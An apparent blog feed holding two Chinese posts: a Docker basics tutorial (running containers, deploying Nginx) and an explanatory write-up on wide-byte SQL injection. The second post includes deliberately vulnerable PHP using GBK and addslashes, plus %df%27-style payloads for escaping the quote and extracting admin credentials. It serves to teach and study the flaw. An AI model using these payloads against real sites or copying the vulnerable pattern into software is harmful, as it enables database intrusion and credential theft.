只能运行相同或相似内核的操作系统
依赖于Linux内核特性:Namespace和Cgroup(Control Group)
</code></pre><p><img src="http://yotuku.cn/link?url=EyDp5bTlM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=2176a6e5-d922-47e9-80d7-c5a752db4ad7&amp;tk_time=2016111015" alt=""><br>什么是Docker?</p>
<pre><code>将应用程序自动部署到容器的开源引擎
Go语言开源引擎  Github地址： [](https://github.com/docker/docker)
基于Apache 2.0开源授权协议发行
</code></pre><a id="more"></a>
<p>Docker的特点？</p>
<pre><code>提供简单轻量的建模方式
职责的逻辑分离
快速搞笑的开发生命周期
鼓励使用面向服务的架构
</code></pre><p>Docker的使用场景</p>
<pre><code>1 使用Docker容器开发，测试，部署服务
2 创建隔离的运行环境
3 搭建测试环境
4 构建多用户的平台即服务基础设施
5 提供软件即服务应用程序
6 高性能，多规模的宿主机部署
</code></pre><p>Docker的基本组成</p>
<pre><code>Docker Client客户端；Daemon守护进程；Image镜像；Container容器;Registry仓库
</code></pre><h4 id="Docker客户端-守护进程"><a href="#Docker客户端-守护进程" class="headerlink" title="Docker客户端/守护进程"></a>Docker客户端/守护进程</h4><pre><code> C/S架构
本地/远程
</code></pre><p><img src="http://yotuku.cn/link?url=E1d-1fTlz&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=2176a6e5-d922-47e9-80d7-c5a752db4ad7&amp;tk_time=2016111015" alt=""></p>
<h4 id="Docker-Image镜像"><a href="#Docker-Image镜像" class="headerlink" title="Docker Image镜像"></a>Docker Image镜像</h4><pre><code>容器的基石（容器基于镜像启动和运行，镜像就好比容器的的源代码，保存了启动容器的各种条件）
层叠的只读文件系统 bootfs(引导文件系统）当容器启动后将被移到内存中，而引导文件系统将会被卸载;
联合加载（union mount)
</code></pre><h3 id="容器的基本操作"><a href="#容器的基本操作" class="headerlink" title="容器的基本操作"></a>容器的基本操作</h3><p>交互式容器在命令结束后，就停止</p>
<p>启动容器：</p>
<pre><code>$docker run IMAGE [COMMAND][ARG...]
run  在新容器中执行命令
执行单次命令的容器:
ubuntu@ubuntu:~$ docker run ubuntu echo &apos;Hello world&apos;
Hello world

启动交互式容器：
$docker run -i -t IMAGE /bin/bash
    -i --interactive=ture|fasle 默认是false  交互
    -t --tty=true|false 默认是false
ubuntu@ubuntu:~$ docker run -i -t ubuntu /bin/bash
root@44d36a84c016:/# ps -ef
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 03:48 ?        00:00:00 /bin/bash
root         12      1  0 03:49 ?        00:00:00 ps -ef
root@44d36a84c016:/# ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
root@44d36a84c016:/# exit
exit
</code></pre><p>查看容器</p>
<pre><code>$docker ps [-a][-l]
    -a 列出所有的容器
    -l 列出最新创建的容器

CONTAINEG ID docker的守护进程，当启动时为容器分配的唯一ID
NAMES    docker守护进程启动时为容器自动分配的名字

ubuntu@ubuntu:~$ docker ps -l
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
44d36a84c016        ubuntu:latest       &quot;/bin/bash&quot;         7 minutes ago       Exited (0) 6 minutes ago                       gloomy_bohr  
</code></pre><p>如何查看刚刚创建的容器</p>
<pre><code>$docker inspect 参数：容器的名字（ID或友好的名字)
ubuntu@ubuntu:~$ docker inspect 44d36a84c016
[{
&quot;AppArmorProfile&quot;: &quot;&quot;,
&quot;Args&quot;: [],
&quot;Config&quot;: {
    &quot;AttachStderr&quot;: true,
    &quot;AttachStdin&quot;: true,
    &quot;AttachStdout&quot;: true,
    &quot;Cmd&quot;: [
        &quot;/bin/bash&quot;
    ],
    &quot;CpuShares&quot;: 0,
      ........
</code></pre><p>自定义容器名</p>
<pre><code>$docker run --name=自定义名 -i -t IMAGE /bin/bash

ubuntu@ubuntu:~$ docker run --name=container01 -i -t ubuntu /bin/bash
root@89fdd67fcc7c:/# exit
exit
ubuntu@ubuntu:~$ docker inspect container01 
</code></pre><p>重新启动停止的容器</p>
<pre><code>$docker start [-i] 容器名

ubuntu@ubuntu:~$ docker start -i container01 
root@89fdd67fcc7c:/# exit
exit
</code></pre><p>删除停止的容器（只能删除停止的容器)</p>
<pre><code>$docker rm 容器名

ubuntu@ubuntu:~$ docker rm a14eae563c17
a14eae563c17
</code></pre><h3 id="守护式容器"><a href="#守护式容器" class="headerlink" title="守护式容器"></a>守护式容器</h3><p>守护式容器，长期运行，没有交互式的会话，适合运行应用程序和服务</p>
<p>以守护形式运行容器</p>
<pre><code>$docker run -i -t IMAGE /bin/bash
Ctrl+P + Ctrl+Q  将一个交互式的容器转到后台

ubuntu@ubuntu:~$ docker run -i -t ubuntu /bin/bash
root@7a5baebf940a:/# 
root@7a5baebf940a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
7a5baebf940a        ubuntu:latest       &quot;/bin/bash&quot;         3 minutes ago       Up 3 minutes                            dreamy_hopper   
</code></pre><p>附加到运行中的容器</p>
<pre><code>$docker attach 容器名

ubuntu@ubuntu:~$ docker attach 7a

root@7a5baebf940a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
7a5baebf940a        ubuntu:latest       &quot;/bin/bash&quot;         7 minutes ago       Up 7 minutes                            dreamy_hopper       
ubuntu@ubuntu:~$ docker attach 7a

root@7a5baebf940a:/# exit
exit
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES  
</code></pre><p>启动守护式容器</p>
<pre><code>$docker run 镜像名 [COMMAND] [ARG...]
    -d 告诉run命令在启动容器时使用后台的方式来执行命令

ubuntu@ubuntu:~$ docker run --name dc3 -d ubuntu /bin/sh -c &quot;while true;do echo hello world;sleep 1;done&quot;
29de71a93dfaf67cb27b6fa5d953ecd6ca924e6b1923a31d6f41995af268af24
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS              PORTS               NAMES
29de71a93dfa        ubuntu:latest       &quot;/bin/sh -c &apos;while t   4 seconds ago       Up 3 seconds                            dc3        
</code></pre><p>查看容器日志</p>
<pre><code>$docker logs [-f][-t][--tail] 容器名
    -f --follows=true|false 默认为false 会一直跟踪日志变化，并返回结果
    -t --timestamps=true|false 默认为false
    --tail=&quot;all&quot;  返回结尾处多少数量的日志

ubuntu@ubuntu:~$ docker logs -t -f --tail 10 dc3
2016-11-13T04:52:46.493926964Z hello world
2016-11-13T04:52:47.495737431Z hello world
2016-11-13T04:52:48.497870319Z hello world
2016-11-13T04:52:49.499945897Z hello world
2016-11-13T04:52:50.501718368Z hello world
2016-11-13T04:52:51.503647625Z hello world .....
</code></pre><p>查看容器内进程</p>
<pre><code>$docker top 容器名

Cubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS              PORTS               NAMES
29de71a93dfa        ubuntu:latest       &quot;/bin/sh -c &apos;while t   4 minutes ago       Up 4 minutes                            dc3                 
ubuntu@ubuntu:~$ docker top dc3
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                69209               66638               0                   20:51               ?                   00:00:00            /bin/sh -c while true;do echo hello world;sleep 1;done
root                69613               69209               0                   20:56               ?                   00:00:00            sleep 1
</code></pre><p>为运行中的容器启动新进程（对运行中的容器维护监控或执行一些管理任务）</p>
<pre><code>$docker exec [-d][-i][-t] 容器名 [COMMAND][ARG..]

ubuntu@ubuntu:~$ docker exec -i -t dc3 /bin/bash
root@29de71a93dfa:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker top dc3
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                69209               66638               0                   20:51               ?                   00:00:00            /bin/sh -c while true;do echo hello world;sleep 1;done
root                69914               66638               0                   21:01               pts/1               00:00:00            /bin/bash
root                69963               69209               0                   21:01               ?                   00:00:00            sleep 1
</code></pre><p>如何停止运行中的容器：</p>
<pre><code>$docker stop 容器名 发送一个信号给容器，并等待容器的停止
$docker kill 容器名  会立刻停止容器

ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS              PORTS               NAMES
29de71a93dfa        ubuntu:latest       &quot;/bin/sh -c &apos;while t   14 minutes ago      Up 14 minutes                           dc3                 
ubuntu@ubuntu:~$ docker stop dc3
dc3
</code></pre><h3 id="使用Docker帮助文件"><a href="#使用Docker帮助文件" class="headerlink" title="使用Docker帮助文件"></a>使用Docker帮助文件</h3><pre><code>man docker-run
man docker-logs
man docker-top
man docker-exec
...
</code></pre><h3 id="在容器中部署静态网站"><a href="#在容器中部署静态网站" class="headerlink" title="在容器中部署静态网站"></a>在容器中部署静态网站</h3><p>设置容器的端口映射</p>
<p>设置容器的端口映射</p>
<pre><code>run [-P][-p]
    -P,--publish-all=ture|false默认为false
将为容器暴露的所有端口进行映射
docker run -P -i -t ubuntu /bin/bash 
    -p,--publish=[]  
containerPort 只指定容器的端口，宿主机端口随机映射
  docker run -p 80 -i -t ubuntu /bin/bash
hostPort:containerPort 同时指定宿主机端口和容器端口
  docker run -p 8080:80 -i -t ubuntu /bin/bash
ip::containerPort  指定ip和容器的端口
  docker run -p 0.0.0.0:80 -i -t ubuntu /bin/bash
ip:hostPort:containerPort 同时指定ip,宿主机和容器的端口
  docker run -p 0.0.0.0:8080:80 -i -t ubuntu /bin/bash
</code></pre><p>Nginx部署流程</p>
<ul>
<li>创建映射80端口的交互式容器</li>
<li>安装Nginx</li>
<li>安装文本编辑器vim</li>
<li>创建静态页面</li>
<li>修改Nginx配置文件</li>
<li>运行Nginx</li>
<li>验证网站访问</li>
</ul>
<p>-</p>
<pre><code>ubuntu@ubuntu:~$ docker run -p 80 --name web -i -t ubuntu /bin/bash
root@3fdfe785153a:/# apt-get update 
root@3fdfe785153a:/# apt-get install -y nginx
root@3fdfe785153a:/# apt-get install -y
root@3fdfe785153a:/# mkdir -p /var/www/html
root@3fdfe785153a:/# cd /var/www/html 
root@3fdfe785153a:/var/www/html# vim index.html

&lt;html&gt;
&lt;head&gt;
        &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
        &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;

root@3fdfe785153a:/var/www/html# whereis nginx
nginx: /usr/sbin/nginx /etc/nginx /usr/share/nginx
root@3fdfe785153a:/var/www/html# ls
index.html  index.nginx-debian.html
root@3fdfe785153a:/var/www/html# ls /etc/nginx 
conf.d        fastcgi_params  koi-win     nginx.conf    scgi_params      sites-enabled  uwsgi_params
fastcgi.conf  koi-utf         mime.types  proxy_params  sites-available  snippets       win-utf
root@3fdfe785153a:/var/www/html# ls /etc/nginx/sites-enabled 
default
root@3fdfe785153a:/var/www/html# vim /etc/nginx/sites-enabled/default 
root@3fdfe785153a:/var/www/html# cd /
root@3fdfe785153a:/# nginx
root@3fdfe785153a:/# ps -ef
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 05:36 ?        00:00:00 /bin/bash
root        816      1  0 06:12 ?        00:00:00 nginx: master process nginx
www-data    817    816  0 06:12 ?        00:00:00 nginx: worker process
www-data    818    816  0 06:12 ?        00:00:00 nginx: worker process
www-data    819    816  0 06:12 ?        00:00:00 nginx: worker process
www-data    820    816  0 06:12 ?        00:00:00 nginx: worker process
root        821      1  0 06:12 ?        00:00:00 ps -ef
root@3fdfe785153a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                   NAMES
3fdfe785153a        ubuntu:latest       &quot;/bin/bash&quot;         37 minutes ago      Up 37 minutes       0.0.0.0:32768-&gt;80/tcp   web                 
ubuntu@ubuntu:~$ docker port web
80/tcp -&gt; 0.0.0.0:32768
ubuntu@ubuntu:~$ docker top web
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                70403               66638               0                   21:36               pts/1               00:00:00            /bin/bash
root                71341               70403               0                   22:12               ?                   00:00:00            nginx: master process nginx
www-data            71342               71341               0                   22:12               ?                   00:00:00            nginx: worker process
www-data            71343               71341               0                   22:12               ?                   00:00:00            nginx: worker process
www-data            71344               71341               0                   22:12               ?                   00:00:00            nginx: worker process
www-data            71345               71341               0                   22:12               ?                   00:00:00            nginx: worker process
ubuntu@ubuntu:~$ curl http://127.0.0.1:32768
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><img src="http://yotuku.cn/link?url=B1HpSFr-l&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=2176a6e5-d922-47e9-80d7-c5a752db4ad7&amp;tk_time=2016111314" alt=""></p>
<pre><code>上面使用的是宿主主机地址，现在使用容器的地址
ubuntu@ubuntu:~$ docker inspect web

&quot;Gateway&quot;: &quot;172.17.42.1&quot;

ubuntu@ubuntu:~$ curl http://172.17.0.10
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;

stop后重新启动访问

ubuntu@ubuntu:~$ docker stop web
web
ubuntu@ubuntu:~$ docker start -i web
root@3fdfe785153a:/# ps -ef
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 06:25 ?        00:00:00 /bin/bash
root         11      1  0 06:27 ?        00:00:00 ps -ef
root@3fdfe785153a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker exec web nginx
ubuntu@ubuntu:~$ docker top web
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                71751               66638               0                   22:25               pts/1               00:00:00            /bin/bash
root                71809               71751               0                   22:28               ?                   00:00:00            nginx: master process nginx
www-data            71810               71809               0                   22:28               ?                   00:00:00            nginx: worker process
www-data            71811               71809               0                   22:28               ?                   00:00:00            nginx: worker process
www-data            71812               71809               0                   22:28               ?                   00:00:00            nginx: worker process
www-data            71813               71809               0                   22:28               ?                   00:00:00            nginx: worker process
</code></pre><p>当停止一个容器并且重新访问时，原来容器的ip地址和端口都将会发生变化</p>
<pre><code>ubuntu@ubuntu:~$ curl http://172.17.0.10
curl: (7) Failed to connect to 172.17.0.10 port 80: No route to host
ubuntu@ubuntu:~$ docker inspect web
.....
  &quot;MountLabel&quot;: &quot;&quot;,
    &quot;Name&quot;: &quot;/web&quot;,
    &quot;NetworkSettings&quot;: {
        &quot;Bridge&quot;: &quot;docker0&quot;,
        &quot;Gateway&quot;: &quot;172.17.42.1&quot;,
        &quot;GlobalIPv6Address&quot;: &quot;&quot;,
        &quot;GlobalIPv6PrefixLen&quot;: 0,
        &quot;IPAddress&quot;: &quot;172.17.0.11&quot;,
        &quot;IPPrefixLen&quot;: 16,
        &quot;IPv6Gateway&quot;: &quot;&quot;,
        &quot;LinkLocalIPv6Address&quot;: &quot;fe80::42:acff:fe11:b&quot;,
        &quot;LinkLocalIPv6PrefixLen&quot;: 64,
        &quot;MacAddress&quot;: &quot;02:42:ac:11:00:0b&quot;,
        &quot;PortMapping&quot;: null,
        &quot;Ports&quot;: {
            &quot;80/tcp&quot;: [
                {
                    &quot;HostIp&quot;: &quot;0.0.0.0&quot;,
                    &quot;HostPort&quot;: &quot;32769&quot;
                }
....
ubuntu@ubuntu:~$ curl http://172.17.0.11
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="查看和删除镜像"><a href="#查看和删除镜像" class="headerlink" title="查看和删除镜像"></a>查看和删除镜像</h3><p>镜像的存储地址</p>
<ul>
<li>/var/lib/docker</li>
</ul>
<p>-</p>
<pre><code>ubuntu@ubuntu:~$ docker info
Containers: 11
Images: 94
Storage Driver: aufs
 Root Dir: /var/lib/docker/aufs
 Backing Filesystem: extfs
 Dirs: 116
 Dirperm1 Supported: true
Execution Driver: native-0.2
Kernel Version: 4.2.0-16-generic
Operating System: Ubuntu 15.10
CPUs: 4
Total Memory: 1.533 GiB
Name: ubuntu
ID: AL2G:N2BW:2DGD:DBKV:GV77:ESDE:5BIG:BOYM:25H2:MHLX:KJK3:VNBF
WARNING: No swap limit support
ubuntu@ubuntu:~$ ls -l /var/lib/docker/aufs
ls: cannot access /var/lib/docker/aufs: Permission denied
ubuntu@ubuntu:~$ sudo ls -l /var/lib/docker/aufs
[sudo] password for ubuntu: 
total 48
drwxr-xr-x 118 root root 16384 Nov 12 21:36 diff
drwxr-xr-x   2 root root 16384 Nov 12 21:36 layers
drwxr-xr-x 118 root root 16384 Nov 12 21:36 mnt
</code></pre><h4 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h4><pre><code>$docker images [OPTSIUNS][REPOSITORY]
   -a,--all=false
   -f,--filter=[]  显示时的过滤条件
   --no-trunc=false  指定不使用截断的方式
   -q,--quiet=false
</code></pre><h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><pre><code>$docker inspect [OPTIONS]CONTAINER|IMAGE[CONTAINER|IMAGE...]
   -f,--format=&quot;&quot;

ubuntu@ubuntu:~$ docker inspect ubuntu:latest 
</code></pre><h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><pre><code>$docker rmi [OPTIONS]IMAGE[IMAGE...]
   -f,--force=false 
   --no-prune=false Do not delete untagged parents

ubuntu:~$ docker rmi wordpress:4.6.1 
</code></pre><h3 id="获取和推送镜像"><a href="#获取和推送镜像" class="headerlink" title="获取和推送镜像"></a>获取和推送镜像</h3><h4 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h4><ul>
<li>Docker Hub</li>
</ul>
<p><a href="https://registry.hub.docker.com" target="_blank" rel="external"></a></p>
<ul>
<li><p>$docker search [OPTIONS]TERM</p>
<pre><code>--automated=false Only show automated builds 自动化选项
--no-trunc=false Don&apos;t truncate output 
-s,--stars=0  Only displays with at least x start 星级
最多返回25个结果
ubuntu@ubuntu:~$ docker search -s 3 ubuntu
NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED
ubuntu                            Ubuntu is a Debian-based Linux operating s...   5033      [OK]       
ubuntu-upstart                    Upstart is an event-based replacement for ...   68        [OK]       
rastasheep/ubuntu-sshd            Dockerized SSH service, built on top of of...   49                   [OK]
consol/ubuntu-xfce-vnc            Ubuntu container with &quot;headless&quot; VNC sessi...   29                   [OK]
ubuntu-debootstrap                debootstrap --variant=minbase --components...   27        [OK]       
torusware/speedus-ubuntu          Always updated official Ubuntu docker imag...   27                   [OK]
ioft/armhf-ubuntu                 [ABR] Ubuntu Docker images for the ARMv7(a...   19                   [OK]
nuagebec/ubuntu                   Simple always updated Ubuntu docker images...   10                   [OK]
nickistre/ubuntu-lamp             LAMP server on Ubuntu                           10                   [OK]
nickistre/ubuntu-lamp-wordpress   LAMP on Ubuntu with wp-cli installed            7                    [OK]
nimmis/ubuntu                     This is a docker images different LTS vers...   5                    [OK]
</code></pre><h4 id="拉取镜像（需要下载到本地"><a href="#拉取镜像（需要下载到本地" class="headerlink" title="拉取镜像（需要下载到本地)"></a>拉取镜像（需要下载到本地)</h4><p>  $docker pull [options] name [:tag]<br>   -a,–all-tags=false<br>  ubuntu@ubuntu:~$ docker pull ubuntu:14.04</p>
<p>   14.04: Pulling from ubuntu<br>  e7176b79954f: Pull complete<br>  e359a53f3a8b: Pull complete<br>  4655efdd3550: Already exists<br>  4d0b81bdf94e: Already exists<br>  82b16b694f1b: Already exists<br>  879409173f70: Already exists<br>  Digest: sha256:bae6d9e8c91f31a11d324495efb3859fce873de1e9db990a62d16e4f263f5a2e<br>  Status: Downloaded newer image for ubuntu:14.04</p>
</li>
</ul>
<h4 id="拉取镜像-加速访问）"><a href="#拉取镜像-加速访问）" class="headerlink" title="拉取镜像(加速访问）"></a>拉取镜像(加速访问）</h4><pre><code>使用--registry-mirror 选项
 1.修改 ： /etc/default/docker
 2.添加：DOCKER_OPTS = &quot;--registry-mirror=http://MIRROR-ADDR&quot;
</code></pre><h4 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h4><pre><code>$docker push NAME:[:TAG]
</code></pre><h3 id="构建docker镜像"><a href="#构建docker镜像" class="headerlink" title="构建docker镜像"></a>构建docker镜像</h3><ul>
<li>1.保存对容器的修改，并再次使用；</li>
<li>2.自定义镜像的能力;</li>
<li><p>3.以软件的形式打包并分发服务及其运行环境</p>
<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><p>  $docker commit  通过容器构建<br>  $docker commit [OPTION] CONTAINEG [REPOSITORY[:TAG]]</p>
<pre><code>-a,--author=&quot;&quot;  作者
-m,--message=&quot;&quot; Commit message  构建信息
-p,--pause=true Pause container during commit  指示不暂停正在运行的容器
</code></pre><p>  ubuntu@ubuntu:~$ docker commit -a “jdrops520” -m ‘nginx’ web jdrops520/commit_web1</p>
<p>  bc4ef9f3e881bd1034dc2dbca62f053044f5ac77696d3bc67e69e749fa1331e7<br>  ubuntu@ubuntu:~$<br>  ubuntu@ubuntu:~$ docker images<br>  REPOSITORY              TAG                 IMAGE ID            CREATED              VIRTUAL SIZE<br>  jdrops520/commit_web1   latest              bc4ef9f3e881        37 seconds ago       275.8 MB<br>  <none>                  <none>              7a32cf0408fa        3 weeks ago          160.5 MB<br>  ubuntu                  latest              56465e1e45d2        4 weeks ago          127.2 MB<br>  ubuntu                  14.04               e359a53f3a8b        4 weeks ago          187.9 MB<br>  <none>                  <none>              04b555fcaf13        9 weeks ago          341.8 MB<br>  <none>                  <none>              07a3e6032afb        3 months ago         188 MB<br>  hello-world             latest              f0cb9bdcaa69        4 months ago         1.848 kB<br>  ubuntu                  12.10               c5881f11ded9        2.406760 years ago   172.1 MB<br>  ubuntu@ubuntu:~$ docker run -d –name nginx_web1 jdrops520/commit_web1 nginx -g “daemon off;”<br>  35423f6554dc8cddc95dd88f924e9ab091ae330094e9aa7ba159c1d11e68019a<br>  ubuntu@ubuntu:~$ docker ps<br>  CONTAINER ID        IMAGE                          COMMAND                CREATED             STATUS              PORTS                   NAMES<br>  35423f6554dc        jdrops520/commit_web1:latest   “nginx -g ‘daemon of   17 seconds ago      Up 16 seconds       80/tcp                  nginx_web1<br>  3fdfe785153a        ubuntu:latest                  “/bin/bash”            3 hours ago         Up 2 hours          0.0.0.0:32769-&gt;80/tcp   web<br>  ubuntu@ubuntu:~$ curl <a href="http://127.0.0.1:32769" target="_blank" rel="external">http://127.0.0.1:32769</a><br>  <html><br>  <head></head></html></none></none></none></none></none></none></p>
<pre><code>&lt;title&gt;Nginx in Docker&lt;/title&gt;
</code></pre><p>  <br>  <body></body></p>
<pre><code>&lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
</code></pre><p>  <br>  <br>使用Dockerfile创建镜像<br>创建第一个Dockerfile       </p>
<p>  $docker build   通过Dockerfile文件构建<br>  $docker build [OPTIONS]PATH |URL|-</p>
<pre><code>--force-rm=false
--no-cache=false
--pull=false
-q,--quiet=false
--rm=ture
-t,--tag=&quot;&quot; 指定构建出的镜像的名字
</code></pre></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[全局防护Bypass之宽字节注入]]></title>
      <url>http://yoursite.com/2016/10/29/%E5%85%A8%E5%B1%80%E9%98%B2%E6%8A%A4Bypass%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h3 id="1-了解宽字节的背景"><a href="#1-了解宽字节的背景" class="headerlink" title="1 了解宽字节的背景"></a>1 了解宽字节的背景</h3><p>宽字节注入的源于程序员设置MySQL连接时的错误配置为：</p>
<pre><code>set character_set_client=gbk
</code></pre><p>,这样的配置会引发代码转换从而导致注入漏洞。具体分析一下原理：</p>
<p>1.正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为\’;</p>
<a id="more"></a>
<p>2.若存在宽字节注入，输入%df%27时，经过单引号的转义变成了%df%5c%27，之后再数据库查询语句进行GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成汉字”運”,单引号逃逸出来，从而造成了注入漏洞。</p>
<p>现在基本都会讲mysql的连接配置设置为</p>
<pre><code>[set character_set_client=binary]
</code></pre><p>来解决这个问题，这篇博客将介绍php中因为编码或字符编码转换导致的注入问题。</p>
<h3 id="2-mysql中的宽字符注入"><a href="#2-mysql中的宽字符注入" class="headerlink" title="2 mysql中的宽字符注入"></a>2 mysql中的宽字符注入</h3><p>测试搭建学习的环境利用了phithon内容管理系统，看代码</p>
<pre><code>&lt;?php
//连接数据库部分，注意使用了gbk编码
$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;);
mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);
mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);
//执行sql语句
$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;
$sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;;
$result = mysql_query($sql, $conn) or die(mysql_error());
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;gbk&quot; /&gt;
&lt;title&gt;新闻&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;?php
$row = mysql_fetch_array($result, MYSQL_ASSOC);
echo &quot;&lt;h2&gt;{$row[&apos;title&apos;]}&lt;/h2&gt;&lt;p&gt;{$row[&apos;content&apos;]}&lt;p&gt;\n&quot;;
mysql_free_result($result);
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>SQL语句是SELECT * FROM news WHERE tid=’{$id}’，根据文章的id把文章从news表中提取出来，在$sql之前，我们只用了限制函数addslashes函数，对$id进行转义，只要我们输入参数在单引号中，就逃逸不出单引号的限制，从而无法注入。</p>
<p>我们这里利用的是mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字节是一个汉字（前一个ascii码要大于128，才到汉字范围），我们测试输入%df’<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029141036.png" alt=""><br>已经报错，看到报错，说明sql语句出错，看到出错说明可以注入。报错的原因就是多了一个单引号，而单引号前面的反斜杠不见啦。这就是mysql的特性，因为gbk是多字节编码，它人为两个字代表一个字节，所以%df和后面的%5c变成了汉字“運”，而’逃逸了出来。</p>
<p>因为是两个字节代表一个汉字，我们尝试%df%df%27:<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029142058.png" alt=""><br>不报错了，因为%df%df组成了汉字”哌”,%5c%27不是汉字，仍然是\’</p>
<p>mysql如何判断一个字符是不是一个汉字，根据gbk编码，第一个字节的ascii码大于128，基本上就行，若不用%df二用%a1也可以<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029143324.png" alt=""><br>%a1%5c虽然不是一个汉字，但一定会被mysql认为是一个宽字符，所以就能让后面的%27逃逸出来，构造一个exp，查询管理人员的账号密码。<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029144420.png" alt=""></p>
<p>####GB12和GBK的区别<br>gb2312和gbk都是宽字节家族医院，但是当把数据库编码设置为关闭gb2312时，结果就不能注入</p>
<pre><code>&lt;?php
//连接数据库部分，注意使用了gbk编码
$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;);
mysql_query(&quot;SET NAMES &apos;gb2312&apos;&quot;);
mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);
//执行sql语句
$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;
$sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;;
$result = mysql_query($sql, $conn) or die(mysql_error());
?&gt;
</code></pre><p>这主要是gb2312编码取值范围的事情，它高位范围0xA1~0xF7，低位范围是0xA1~0xFE，\是%5c，是不在低范围中的，即其根本不是gb2312遍吗，故其不会被吃掉。故只要低位的范围中含有0x5c的编码，就可以进行宽字节的注入</p>
